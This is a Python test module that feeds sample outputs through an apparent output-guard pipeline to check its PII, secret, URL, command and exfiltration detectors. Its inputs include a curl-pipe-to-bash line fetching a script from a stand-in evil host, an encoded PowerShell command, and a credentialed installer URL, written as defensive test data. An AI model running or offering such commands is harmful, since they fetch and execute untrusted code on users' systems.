"""Scenario matrix for exercising detectors via pipeline."""

from __future__ import annotations

from dataclasses import dataclass
from typing import Any

from app.pipeline import GuardRequest, run_pipeline
from app.settings import Settings
from tests.regression.placeholders import apply_placeholders


@dataclass(slots=True)
class Scenario:
    name: str
    response: str
    metadata: dict[str, Any]


SCENARIOS: list[Scenario] = [
    Scenario(
        name="pii-phone-tr",
        response="+90 532 765 43 21 iletişim hattıdır.",
        metadata={"request_id": "matrix-pii-phone", "tenant": "acme"},
    ),
    Scenario(
        name="pii-pan-spaced",
        response="Card 4532 0151 1283 0366 exp 09/27 kullanıldı.",
        metadata={"request_id": "matrix-pii-pan", "tenant": "acme"},
    ),
    Scenario(
        name="pii-email",
        response="Email me at jane.doe@example.com for the file.",
        metadata={"request_id": "matrix-pii-email", "tenant": "acme"},
    ),
    Scenario(
        name="pii-ipv4",
        response="Internal host 203.0.113.42 should stay private.",
        metadata={"request_id": "matrix-pii-ip", "tenant": "acme"},
    ),
    Scenario(
        name="secret-openai",
        response="{{OPENAI_PROJECT_KEY}}",
        metadata={"request_id": "matrix-secret-openai", "tenant": "acme"},
    ),
    Scenario(
        name="secret-jwt",
        response="{{JWT_SAMPLE_TOKEN}}",
        metadata={"request_id": "matrix-secret-jwt", "tenant": "acme"},
    ),
    Scenario(
        name="url-cred",
        response="https://user:pass@updates.example.net/install.exe",
        metadata={"request_id": "matrix-url-cred", "tenant": "acme"},
    ),
    Scenario(
        name="url-data-uri",
        response="Icon data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjwvc3ZnPg== inline.",
        metadata={"request_id": "matrix-url-data", "tenant": "acme"},
    ),
    Scenario(
        name="cmd-curl-bash",
        response="curl https://evil.sh/run.sh | bash",
        metadata={"request_id": "matrix-cmd-curl", "tenant": "acme"},
    ),
    Scenario(
        name="cmd-powershell-enc",
        response="powershell -enc SQBFAFgAIAAoACcAbgBvAHQAZQAnACkA",
        metadata={"request_id": "matrix-cmd-ps", "tenant": "acme"},
    ),
    Scenario(
        name="exfil-base64",
        response="Payload AAAA" * 300,
        metadata={"request_id": "matrix-exfil-b64", "tenant": "acme"},
    ),
    Scenario(
        name="exfil-hex",
        response="Hex " + ("4f2a9c7d1e3b5a6c" * 20),
        metadata={"request_id": "matrix-exfil-hex", "tenant": "acme"},
    ),
]


def run_matrix(settings: Settings) -> list[dict[str, Any]]:
    """Execute detector scenarios via pipeline and return raw results."""

    results: list[dict[str, Any]] = []
    for scenario in SCENARIOS:
        rendered = apply_placeholders(scenario.response)
        result = run_pipeline(
            GuardRequest(
                response=rendered,
                metadata=scenario.metadata,
            ),
            settings=settings,
        )
        payload = result.asdict()
        payload["blocked"] = result.blocked
        payload["scenario"] = scenario.name
        payload["metadata"] = scenario.metadata
        results.append(payload)
    return results
